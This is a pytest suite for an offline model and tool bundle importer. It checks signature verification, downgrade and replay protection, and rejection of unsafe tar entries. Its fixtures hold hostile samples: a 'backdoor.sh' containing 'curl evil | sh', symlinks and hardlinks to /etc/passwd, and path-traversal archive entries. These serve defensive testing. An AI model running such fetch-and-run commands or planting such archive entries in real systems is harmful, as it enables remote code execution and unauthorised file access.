"""F24: offline bundles (EX-T12).

Every hostile bundle is rejected with a stable reason, and the active
installation stays exactly as it was.
"""

from __future__ import annotations

import io
import json
import stat
import tarfile
from pathlib import Path

import pytest
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from forge.bundle.importer import BundleImporter, BundleRejected, build_bundle, host_platform
from forge.contracts.clock import FixedClock
from forge.contracts.errors import ForgeError

CREATED = "2026-11-01T00:00:00Z"
EXPIRES = "2027-11-01T00:00:00Z"


@pytest.fixture
def signing_key() -> Ed25519PrivateKey:
    return Ed25519PrivateKey.generate()


@pytest.fixture
def importer(tmp_path: Path, clock: FixedClock, human, signing_key) -> BundleImporter:  # noqa: ANN001
    made = BundleImporter(tmp_path / "install", clock=clock)
    made.enroll_key("staging-2026", signing_key.public_key(), human)
    return made


def make_bundle(tmp_path: Path, name: str, key: Ed25519PrivateKey | None, *, sequence: int = 1,
                files: dict[str, bytes] | None = None, expires: str = EXPIRES,
                platforms: list[str] | None = None) -> Path:
    source = tmp_path / f"{name}-source"
    for relative, data in (files or {"models/tiny.gguf": b"weights v%d" % sequence, "tools/ruff.txt": b"ruff"}).items():
        (source / relative).parent.mkdir(parents=True, exist_ok=True)
        (source / relative).write_bytes(data)
    return build_bundle(source, tmp_path / name, bundle_id="forge-core", sequence=sequence, created_at=CREATED,
                        expires_at=expires, platforms=platforms or ["any"], kinds={"models/tiny.gguf": "model"},
                        key=key)


def rejected(importer: BundleImporter, source: Path, **kwargs) -> str:  # noqa: ANN003
    with pytest.raises(BundleRejected) as caught:
        importer.import_bundle(source, **kwargs)
    return caught.value.reason


def test_signed_bundle_installs_read_only_and_becomes_active(tmp_path, importer, signing_key) -> None:
    bundle = make_bundle(tmp_path, "v1", signing_key)
    assert importer.import_bundle(bundle) == 1
    assert importer.active("forge-core") == 1
    version_dir = importer.root / "forge-core" / "versions" / "1"
    assert (version_dir / "models" / "tiny.gguf").read_bytes() == b"weights v1"
    mode = (version_dir / "models" / "tiny.gguf").stat().st_mode
    assert not mode & (stat.S_IWUSR | stat.S_IWGRP | stat.S_IWOTH)
    assert json.loads((version_dir / "manifest.json").read_text())["sequence"] == 1
    kind, detail = importer.history("forge-core")[-1]
    assert kind == "installed" and json.loads(detail) == {"sequence": 1, "key": "staging-2026"}
    assert not any((importer.root / "quarantine").iterdir())


def test_newer_version_switches_the_pointer_and_keeps_the_old_one(tmp_path, importer, signing_key) -> None:
    importer.import_bundle(make_bundle(tmp_path, "v1", signing_key, sequence=1))
    importer.import_bundle(make_bundle(tmp_path, "v2", signing_key, sequence=2))
    assert importer.active("forge-core") == 2
    assert (importer.root / "forge-core" / "versions" / "1" / "models" / "tiny.gguf").read_bytes() == b"weights v1"
    assert importer.highest_seen("forge-core") == 2


@pytest.fixture
def installed(tmp_path, importer, signing_key) -> BundleImporter:  # noqa: ANN001
    importer.import_bundle(make_bundle(tmp_path, "v2", signing_key, sequence=2))
    assert importer.active("forge-core") == 2
    return importer


def assert_untouched(importer: BundleImporter) -> None:
    assert importer.active("forge-core") == 2
    assert importer.highest_seen("forge-core") == 2
    assert sorted(p.name for p in (importer.root / "forge-core" / "versions").iterdir()) == ["2"]
    assert (importer.root / "forge-core" / "versions" / "2" / "models" / "tiny.gguf").read_bytes() == b"weights v2"


def test_unsigned_bundle_is_rejected(tmp_path, installed) -> None:
    assert rejected(installed, make_bundle(tmp_path, "v3", None, sequence=3)) == "unsigned"
    assert_untouched(installed)


def test_bundle_signed_by_an_unenrolled_key_is_rejected(tmp_path, installed) -> None:
    stranger = Ed25519PrivateKey.generate()
    assert rejected(installed, make_bundle(tmp_path, "v3", stranger, sequence=3)) == "bad_signature"
    assert_untouched(installed)


def test_a_key_shipped_inside_the_bundle_is_not_trusted(tmp_path, installed) -> None:
    attacker = Ed25519PrivateKey.generate()
    bundle = make_bundle(tmp_path, "v3", attacker, sequence=3)
    raw = attacker.public_key().public_bytes_raw()
    (bundle / "signing_key.pub").write_bytes(raw)  # the attacker supplies both bundle and key
    assert rejected(installed, bundle) == "bad_signature"
    assert_untouched(installed)


def test_revoked_key_no_longer_verifies(tmp_path, installed, signing_key, human) -> None:
    installed.revoke_key("staging-2026", human)
    assert rejected(installed, make_bundle(tmp_path, "v3", signing_key, sequence=3)) == "unknown_key"
    assert_untouched(installed)


def test_manifest_edited_after_signing_is_rejected(tmp_path, installed, signing_key) -> None:
    bundle = make_bundle(tmp_path, "v3", signing_key, sequence=3)
    manifest = json.loads((bundle / "manifest.json").read_text())
    manifest["expires_at"] = "2099-01-01T00:00:00Z"
    (bundle / "manifest.json").write_text(json.dumps(manifest, sort_keys=True, separators=(",", ":")))
    assert rejected(installed, bundle) == "bad_signature"
    assert_untouched(installed)


def test_garbage_signature_is_rejected(tmp_path, installed, signing_key) -> None:
    bundle = make_bundle(tmp_path, "v3", signing_key, sequence=3)
    (bundle / "manifest.sig").write_text("not base64 at all!!")
    assert rejected(installed, bundle) == "bad_signature"
    assert_untouched(installed)


def test_corrupted_file_is_rejected(tmp_path, installed, signing_key) -> None:
    bundle = make_bundle(tmp_path, "v3", signing_key, sequence=3)
    (bundle / "files" / "models" / "tiny.gguf").write_bytes(b"weights v3 but tampered")
    assert rejected(installed, bundle) == "corrupted"
    assert_untouched(installed)


def test_missing_file_is_rejected(tmp_path, installed, signing_key) -> None:
    bundle = make_bundle(tmp_path, "v3", signing_key, sequence=3)
    (bundle / "files" / "tools" / "ruff.txt").unlink()
    assert rejected(installed, bundle) == "corrupted"
    assert_untouched(installed)


def test_extra_unlisted_file_is_rejected(tmp_path, installed, signing_key) -> None:
    bundle = make_bundle(tmp_path, "v3", signing_key, sequence=3)
    (bundle / "files" / "tools" / "backdoor.sh").write_text("curl evil | sh")
    assert rejected(installed, bundle) == "corrupted"
    assert_untouched(installed)


def test_expired_bundle_is_rejected(tmp_path, installed, signing_key, clock) -> None:
    bundle = make_bundle(tmp_path, "v3", signing_key, sequence=3, expires="2026-11-04T08:59:59Z")
    assert rejected(installed, bundle) == "expired"
    assert_untouched(installed)


def test_bundle_expires_when_trusted_time_passes_its_deadline(tmp_path, importer, signing_key, clock) -> None:
    bundle = make_bundle(tmp_path, "v1", signing_key, sequence=1, expires="2026-11-05T09:00:00Z")
    clock.advance(days=1)  # now exactly the expiry instant
    assert rejected(importer, bundle) == "expired"
    assert importer.active("forge-core") is None


def test_downgrade_is_rejected(tmp_path, installed, signing_key) -> None:
    assert rejected(installed, make_bundle(tmp_path, "v1", signing_key, sequence=1)) == "downgrade"
    assert_untouched(installed)


def test_reimporting_the_installed_version_is_a_replay(tmp_path, installed, signing_key) -> None:
    assert rejected(installed, make_bundle(tmp_path, "v2-again", signing_key, sequence=2)) == "replay"
    assert_untouched(installed)


def test_incompatible_platform_is_rejected(tmp_path, installed, signing_key) -> None:
    other = "windows-x86_64" if not host_platform().startswith("windows") else "linux-x86_64"
    bundle = make_bundle(tmp_path, "v3", signing_key, sequence=3, platforms=[other])
    assert rejected(installed, bundle) == "incompatible_platform"
    assert_untouched(installed)


def test_matching_platform_is_accepted(tmp_path, installed, signing_key) -> None:
    bundle = make_bundle(tmp_path, "v3", signing_key, sequence=3, platforms=[host_platform()])
    assert installed.import_bundle(bundle) == 3


def test_failed_admission_leaves_nothing_installed(tmp_path, installed, signing_key) -> None:
    seen: list[Path] = []

    def admission(staging: Path) -> bool:
        seen.append(staging)
        return (staging / "tools" / "ruff.txt").read_bytes() == b"a version that passes"

    assert rejected(installed, make_bundle(tmp_path, "v3", signing_key, sequence=3), admission=admission) \
        == "admission_failed"
    assert seen and not seen[0].exists()
    assert_untouched(installed)


def test_bundle_with_a_symlink_is_rejected(tmp_path, installed, signing_key) -> None:
    bundle = make_bundle(tmp_path, "v3", signing_key, sequence=3)
    (bundle / "files" / "models" / "link").symlink_to("/etc/passwd")
    assert rejected(installed, bundle) == "unsafe_archive"
    assert_untouched(installed)


def tar_of(bundle: Path, out: Path, extra: list[tarfile.TarInfo] | None = None) -> Path:
    with tarfile.open(out, "w") as tar:
        for path in sorted(bundle.rglob("*")):
            tar.add(path, arcname=path.relative_to(bundle).as_posix(), recursive=False)
        for info in extra or []:
            tar.addfile(info, io.BytesIO(b"x" * info.size) if info.isfile() else None)
    return out


def test_signed_tar_archive_installs(tmp_path, installed, signing_key) -> None:
    archive = tar_of(make_bundle(tmp_path, "v3", signing_key, sequence=3), tmp_path / "v3.tar")
    assert installed.import_bundle(archive) == 3
    assert installed.active("forge-core") == 3


@pytest.mark.parametrize("hostile", ["traversal", "absolute", "symlink", "hardlink", "device"])
def test_hostile_tar_entries_are_rejected_before_extraction(tmp_path, installed, signing_key, hostile) -> None:
    info = tarfile.TarInfo({"traversal": "../../escaped", "absolute": "/tmp/forge-escaped"}.get(hostile, "files/x"))
    if hostile in ("traversal", "absolute"):
        info.size = 1
    elif hostile == "symlink":
        info.type, info.linkname = tarfile.SYMTYPE, "/etc/passwd"
    elif hostile == "hardlink":
        info.type, info.linkname = tarfile.LNKTYPE, "/etc/passwd"
    else:
        info.type = tarfile.CHRTYPE
    archive = tar_of(make_bundle(tmp_path, "v3", signing_key, sequence=3), tmp_path / "v3.tar", [info])
    assert rejected(installed, archive) == "unsafe_archive"
    assert not (tmp_path / "escaped").exists() and not Path("/tmp/forge-escaped").exists()
    assert_untouched(installed)


def test_manifest_with_an_unsafe_path_is_rejected_even_when_signed(tmp_path, installed, signing_key) -> None:
    from forge.bundle.importer import BundleFile, BundleManifest, sign_manifest

    bundle = make_bundle(tmp_path, "v3", signing_key, sequence=3)
    manifest = BundleManifest.model_validate_json((bundle / "manifest.json").read_bytes())
    bad = manifest.model_copy(update={"files": [*manifest.files, BundleFile(
        path="../outside", digest=manifest.files[0].digest, size=1, kind="fixture", license="x")]})
    (bundle / "manifest.json").write_bytes(bad.canonical_bytes())
    (bundle / "manifest.sig").write_text(sign_manifest(bad, signing_key))
    assert rejected(installed, bundle) == "malformed"
    assert_untouched(installed)


def test_not_a_bundle_is_malformed(tmp_path, installed) -> None:
    (tmp_path / "plain.txt").write_text("hello")
    assert rejected(installed, tmp_path / "plain.txt") == "malformed"
    (tmp_path / "empty").mkdir()
    assert rejected(installed, tmp_path / "empty") == "malformed"
    assert_untouched(installed)


def test_only_the_trusted_user_enrolls_keys_or_rolls_back(tmp_path, installed, signing_key, model_actor) -> None:
    with pytest.raises(ForgeError):
        installed.enroll_key("attacker", Ed25519PrivateKey.generate().public_key(), model_actor)
    with pytest.raises(ForgeError):
        installed.revoke_key("staging-2026", model_actor)
    installed.import_bundle(make_bundle(tmp_path, "v3", signing_key, sequence=3))
    with pytest.raises(ForgeError):
        installed.rollback("forge-core", 2, model_actor, "because")
    assert installed.active("forge-core") == 3


def test_rollback_is_recorded_and_never_lowers_the_highest_seen(tmp_path, installed, signing_key, human) -> None:
    installed.import_bundle(make_bundle(tmp_path, "v3", signing_key, sequence=3))
    installed.rollback("forge-core", 2, human, "v3 model regressed on the evaluation set")
    assert installed.active("forge-core") == 2
    assert installed.highest_seen("forge-core") == 3
    kind, detail = installed.history("forge-core")[-1]
    assert kind == "rollback" and json.loads(detail)["reason"] == "v3 model regressed on the evaluation set"
    # Rolling back is an operator decision, not a way to re-admit old bundles.
    assert rejected(installed, make_bundle(tmp_path, "v1", signing_key, sequence=1)) == "downgrade"
    with pytest.raises(ForgeError):
        installed.rollback("forge-core", 7, human, "not installed")


def test_ledger_survives_a_restart(tmp_path, installed, signing_key, clock) -> None:
    reopened = BundleImporter(installed.root, clock=clock)
    assert reopened.highest_seen("forge-core") == 2
    assert rejected(reopened, make_bundle(tmp_path, "v1", signing_key, sequence=1)) == "downgrade"
    assert reopened.import_bundle(make_bundle(tmp_path, "v3", signing_key, sequence=3)) == 3
